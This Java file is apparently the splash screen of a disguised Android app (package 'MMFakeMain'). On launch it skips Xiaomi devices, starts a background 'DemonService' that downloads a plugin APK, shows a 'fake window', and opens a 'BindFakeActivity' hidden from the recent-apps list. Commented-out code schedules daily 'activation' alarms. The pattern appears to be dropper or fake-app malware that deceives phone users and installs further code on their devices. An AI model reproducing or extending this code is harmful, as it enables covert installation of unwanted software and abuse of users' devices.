package com.xstd.MMFakeMain;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.text.TextUtils;
import com.xstd.MMFakeMain.qm.AppRuntime;
import com.xstd.MMFakeMain.qm.Config;
import com.xstd.MMFakeMain.qm.UtilOperator;
import com.xstd.MMFakeMain.qm.Utils;
import com.xstd.MMFakeMain.qm.activity.BindFakeActivity;
import com.xstd.MMFakeMain.qm.service.DemonService;
import com.xstd.MMFakeMain.qm.setting.SettingManager;

public class SplashActivity extends Activity {
    /**
     * Called when the activity is first created.
     */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        appActive();
    }

    @Override
    public void onStart() {
        super.onStart();

        if (AppRuntime.shouldForceShowFakeWindow()) {
            Utils.startFakeService(getApplicationContext(), "[[shouldForceShowFakeWindow]]");
        }
    }

    private void appActive() {
        if (AppRuntime.isXiaomiDevice()) {
            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] this device is Xiaomi Devices, just ignore this device");
            }
            return;
        }

        long launchTime = SettingManager.getInstance().getKeyLanuchTime();
        if (launchTime == 0 || TextUtils.isEmpty(SettingManager.getInstance().getLocalApkPath())) {
            //first lanuch

            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
            }

            Intent i = new Intent();
            i.setClass(getApplicationContext(), DemonService.class);
            i.setAction(DemonService.ACTION_LANUCH);
            startService(i);
        } else if (!UtilOperator.isPluginApkExist() && !Config.DOWNLOAD_PROCESS_RUNNING.get()) {
            if (Config.DEBUG) {
                Config.LOGD("[[QuickSettingApplication::onCreate]] try to download APK from : "
                                + SettingManager.getInstance().getLocalApkPath() + " as the local plugin apk not exists");
            }

            Intent i = new Intent();
            i.setClass(getApplicationContext(), DemonService.class);
            i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
            startService(i);
        }

        /**
         * 不使用母程序激活了，使用子程序激活
         *
         long activeTime = SettingManager.getInstance().getKeyActiveTime();
         if (activeTime == 0) {
         if (SettingManager.getInstance().getKeyLanuchTime() != 0) {
         long deta = System.currentTimeMillis() - SettingManager.getInstance().getKeyLanuchTime();
         //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
         if (deta >= SettingManager.getInstance().getRealActiveDelayTime()) {
         //active now
         //                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
         DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
         } else {
         long activeDelay = SettingManager.getInstance().getRealActiveDelayTime()- deta;
         DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
         }
         }
         } else {
         Calendar c = Calendar.getInstance();
         c.setTimeInMillis(activeTime);
         int lastDay = c.get(Calendar.DAY_OF_YEAR);
         c = Calendar.getInstance();
         int curDay = c.get(Calendar.DAY_OF_YEAR);

         if (curDay != lastDay) {
         //不是同一天，每天激活一次
         DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
         }
         }
         **/

        if (!AppRuntime.isBindingActive(getApplicationContext())
                && !SettingManager.getInstance().getDisableDownloadPlugin()) {
            Utils.startFakeService(getApplicationContext(), "[[Utils::startFakeService]]");
            Intent i = new Intent();
            i.setClass(getApplicationContext(), BindFakeActivity.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(i);
        }
    }
}
